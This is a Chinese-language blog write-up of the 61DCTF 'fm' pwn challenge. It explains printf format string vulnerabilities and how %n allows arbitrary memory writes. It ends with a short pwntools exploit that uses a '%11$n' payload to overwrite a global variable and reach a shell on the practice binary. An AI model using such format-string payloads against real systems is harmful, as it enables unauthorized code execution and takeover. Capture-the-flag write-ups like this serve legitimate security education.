---
title: 61DCTF fm の Write-Up
date: 2020-09-08 16:08:05
categories:
- WriteUPs
- JarvisOJ
tags:
- PWN
- 61DCTF
- Stack
---
## Introduction

程序运行截图：

![](/img/fm/fm1.png)

<!-- more -->

checksec发现存在Canary以及DEP保护：

![](/img/fm/fm2.png)

## Analysis

将程序通过IDA打开，首先是main函数：

![](/img/fm/fm3.png)

可以看到主函数里就已经存在`system("/bin/sh")`的语句，基本思路当然要满足跳转条件，执行该语句。

根据运行结果可以知道这个`x`在程序中被定为3，我们需要将其改为4。而在`printf(&buf)`这里存在典型的格式化字符串漏洞，通过该漏洞可以实现任意内存写入。

## Vulnerability

解题关键在于了解格式化字符串漏洞，而在了解这个漏洞之前，首先要了解一下printf函数（其他函数类似sprintf、fprintf等print家族函数都会存在同样的问题）。

printf函数用法是`printf(“格式化字符串”, 参数…)`，函数返回值是int类型，返回正确输出的字符个数。如果输出失败，返回负值。参数个数不确定，可以是多个，也可以没有参数。

prtintf函数的格式化字符串常见的有下面几种：

```
%a  浮点数、十六进制数字和p-记数法（c99
%A  浮点数、十六进制数字和p-记法（c99）
%c  一个字符(char)
%C  一个ISO宽字符
%d  有符号十进制整数(int)（%ld、%Ld：长整型数据(long),%hd：输出短整形。）　
%e  浮点数、e-记数法
%E  浮点数、E-记数法
%f  单精度浮点数(默认float)、十进制记数法（%.nf  这里n表示精确到小数位后n位.十进制计数）
%g  根据数值不同自动选择%f或%e．
%G  根据数值不同自动选择%f或%e.
%i  有符号十进制数（与%d相同）
%o  无符号八进制整数
%p  指针
%s  对应字符串char*（%s = %hs = %hS 输出 窄字符）
%S  对应宽字符串WCAHR*（%ws = %S 输出宽字符串）
%u  无符号十进制整数(unsigned int)
%x  使用十六进制数字0xf的无符号十六进制整数　
%X  使用十六进制数字0xf的无符号十六进制整数
%%  打印一个百分号
```

还有不常见的%n，会将%n之前打印出来的字符个数赋值给一个变量。此外还有%hn（写入目标空间2字节），%hhn（写入目标空间1字节），%lln（写入目标空间8字节）。

例如这样一个程序：

```C#
# include <stdio.h>
int main(){
  int n = 0;
  printf("test%n\n", &n);
  printf("n is %d\n", n);
  return 0;
}
```

程序编译运行之后输出的n是4。

接下来就可以去了解一下格式化字符串漏洞了。正确的printf函数用法应该是这样的：

```C#
#include <stdio.h>
int main(){
  int n = 6;
  printf("%d\n", n);
  return 0;
}
```

而有时候也会被省略成这样：

```C#
# include <stdio.h>
int main(){
  char a[] = "coldsnap";
  printf(n);
  return 0;
}
```

两种方式写法上没什么问题，但是当把字符串输入权交给用户时，就会造成严重的问题。考虑这样一个程序：

```C#
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
	char s[100];
	scanf("%s", s);
	printf(s);
	return 0;
}
```

如果用户输入的不是正常的字符串，而是格式化字符串`%x%x`，则会输出内存中的数据：

![](/img/fm/fm4.png)

这是由于printf函数并不知道参数个数，在其内部有个指针，用来检索格式化字符串。对于特定类型的格式化字符串，去取相应参数的值，直到结束。所以尽管程序中没有参数，上面的代码也会将输入的fromat string后面的内存当作参数以%x即16进制方式输出，造成内存泄漏的问题。

通过内存泄露问题就要引申到任意内存读取的问题上，当然前提是需要确定局部变量是储存在栈中，这样理论上通过很多个`%x`就可以读到想要的内存位置。

也可通过`%< number>$x`是直接读取第number个位置的参数，同样可以用在%n，%d等等。

但是需要注意64位程序，前6个参数是存在寄存器中的，从第7个参数开始才会出现在栈中，所以栈中从格式化串开始的第一个，应该是`%7$n`。

甚至通过这个漏洞可以实现任意地址写入，需要用到linux自带的printf命令，将shellcode编码转义为字符。（注意用反引号将printf命令括住，反引号在Tab键的上面，反引号内的内容会被当做命令执行。）如果是用scanf输入字符串，则无法使用printf命令，只能对照ascii码表，scanf和命令行输入的shellcode编码不能直接被转义。

例如通过`"`printf '\x41\x41\x41\x41’`"`将0x41414141这个地址写入内存，下面只需用%s读取对应位置，就能读取以0x41414141为首地址的字符串。

如果用%n就能将0x41414141这个地址指向的值修改，就能造成任意内存的修改，可以将栈中返回地址修改为想要执行的shellcode的首地址等等。

这里要注意ASLR的问题。

## PWN

接下来就来继续分析刚开始那道题。

通过Analysis部分的分析，程序中存在格式化字符串漏洞。通过`x_addr%[i]$n`命令，可以将已经输出的字符个数写入到指定的参数中，这个格式化字符串会在栈上的某处，需要定位x_addr作为printf的第几个参数来确定[i]的值，由于x_addr在32位程序中刚好是4个字节，所以这个格式化字符串刚好能把相应参数变为4。

首先是main函数中的x位置，根据下图x_addr应该是0x804a02c：

![](/img/fm/fm5.png)

然后再确定偏移：

![](/img/fm/fm6.png)

将程序断在printf函数，发现输入的数据“aaaaaa”在栈上地址为0xffb171ec，原来数据的地址为0xffb171c0。两者地址差值便是偏移为44。这个程序是32位程序，每个格式化字符串位4字节，所以偏移数为11。

最后就是写脚本了：

```Python
from pwn import *

sh = process('./fm')
# sh = remote('pwn2.jarvisoj.com', '9895')

x_addr = 0x804a02c

payload = p32(x_addr) + "%11$n"

sh.sendline(payload)
sh.interactive()
sh.close()
```

脚本本地运行结果：

![](/img/fm/fm7.png)
